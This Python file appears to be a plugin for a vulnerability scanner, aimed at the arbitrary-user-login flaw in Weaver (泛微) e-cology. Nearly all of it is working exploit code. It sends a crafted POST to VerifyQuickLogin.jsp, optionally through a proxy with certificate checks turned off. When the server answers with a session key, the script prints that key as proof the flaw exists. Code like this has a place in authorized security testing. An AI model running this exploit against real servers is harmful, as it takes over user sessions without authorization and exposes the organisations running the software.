import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        s = requests.session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        path = 'mobile/plugin/VerifyQuickLogin.jsp'
        data = 'identifier=1&language=1&ipaddress=1.1.1.1'
        logging.captureWarnings(True)
        aa1 = s.post(url1 + path, cookies=s_cookie,data=data,headers=headers,proxies=proxies, verify=False, timeout=10)
        if aa1.status_code == 200 and '"sessionkey":"' in aa1.text:
            cdd='[+]漏洞存在\n'+ str(aa1.text)+'\n\n路径：'+path+'请求内容：\n'+data
        else:
            cdd='[-]漏洞不存在\n'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ 泛微 e-cology任意用户登录漏洞 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)